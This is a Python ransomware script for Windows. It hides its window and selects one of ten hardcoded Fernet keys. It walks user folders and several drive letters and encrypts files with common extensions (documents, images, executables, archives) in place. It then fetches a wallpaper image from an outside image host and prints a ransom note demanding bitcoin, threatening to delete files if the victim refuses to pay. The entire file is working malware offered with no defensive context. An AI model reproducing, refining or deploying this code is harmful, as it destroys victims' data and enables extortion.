from cryptography.fernet import Fernet
import getpass
import os
import random
import win32gui,win32con
from threading import Thread
from itertools import chain
import ctypes
import requests

the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

# key generation
random_publickeys = ["white","health","apple","city","newyork","house","movie","spider","egg","meal"] #0-9
class H:
    white = b"97dB4ofCSRdX-UMn3CrLLnnqNaJI-9hdVVMsXq1R_KE="
    health = b"ZdHoAJv4U6+KTaj9zTVSrx+LxymSuaIA33EBgTSTQJ4="
    apple = b"5qGnF9yPVkg50T2iaVdy/PBHPWGBOVMbkOuq5nj38DU="
    city = b"02A14ZFpplHz531dkghg15yFN5F3KTsyqxglNp5u8dc="
    newyork = b"HaIz7q83ao1VtVJrEMCvKYkZWTH+4mX8BGKKCOG9PyQ="
    house = b"ieIukfw55N+R3fYb9AwWs+9dpuMehWGBC8ZuL6wLpy0="
    movie = b"eVvVv1n5M/apL427DjzYeZzNfrQJHe57Tj+d4V108pU="
    spider = b"HxBDcR75HabpaxArR28LEgNilCFCA4jFnKl2fTLKuzI="
    egg = b"T90ACVwlD0PvwEggJGayL+AO8oGJVqTB9O0B/jJ6Awk="
    meal = b"LwzSl4fQQnBIAvOhXo0WAUPt0KEROBY9DDWQFMaZ/s8="

rnd = random.randint(1000,10000)
random_publickeys = {"white":H.white,"health":H.health,"apple":H.apple,"city":H.city,"newyork":H.newyork,"house":H.house,"movie":H.movie,"spider":H.spider,"egg":H.egg,"meal":H.meal} #0-9
random.seed(rnd)
key = random.choice(list(random_publickeys.values()))
random.seed(rnd)
yourkey = random.choice(list(random_publickeys))

  
with open('filekey.key', 'wb') as filekey:
   filekey.write(key)

with open('filekey.key', 'rb') as filekey:
    key = filekey.read()

fernet = Fernet(key)
currpath = os.getcwd()
os.remove(f"{currpath}/filekey.key")
encrypted_extension = (".exe",".txt",".jpg",".lnk",".ico",".pptx",".docx",".dll",".mp4",".mp3",".bin",".rtf",".odt",".png",".pdf",".zip",".rar")
#GRAB ALL FILES FROM (encrypted_extension)
all_file_paths = []
paths = ('C:\\Users\\','F:\\','G:\\','Y:\\','S:\\','M:\\','N:\\','X:\\')
for root,dirs,files in chain.from_iterable(os.walk(path) for path in paths):
    try:
        for file in files:
            file_path,file_ext = os.path.splitext(root+"\\"+file)
            if file_ext in encrypted_extension:
                all_file_paths.append(root+"\\"+file)
    except:
        pass

def encryptf():
    for f in all_file_paths:
        try:
            with open(f, 'rb') as file:
                original = file.read()
                
            encrypted = fernet.encrypt(original)
            
            with open(f, 'wb') as encrypted_file:
                encrypted_file.write(encrypted)
        except:
            pass
encryptf()

class BG:
    url = 'https://i.ibb.co/zQ778bc/backgr.jpg'
    r = requests.get(url)
    name = "readme.jpg"

    file = open(name, "wb")
    file.write(r.content)
    file.close()
    PATH = os.path.abspath(name)

    ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)

win32gui.ShowWindow(the_program_to_hide, win32con.SW_SHOW)
os.system("ECHO OFF")
os.system("cls")
os.system("color a")
ENCRYPTEDALL = input(f"""######################################################################################
Hello, all your important files have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!
To purchase your key and restore your data, please follow these three easy steps:
1. Email us to something@protonmail.com -> In the subject of the email write down the word which you can see at the bottom.
2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to something@protonmail.com stating "PAID".
   We will check to see if payment has been paid.
3. You will receive a key that will unlock all your files. 

IMPORTANT:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlock your files.
Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
##############################################################################################################
*IMPORTANT* - Remember or save the generated word below this message. Without it, we cant decrypt your files.
You will send us the word to email, and we will give you the key, and finally you can decrypt your files.

--->       {yourkey}     <--- SAVE OR REMEMBER
""")

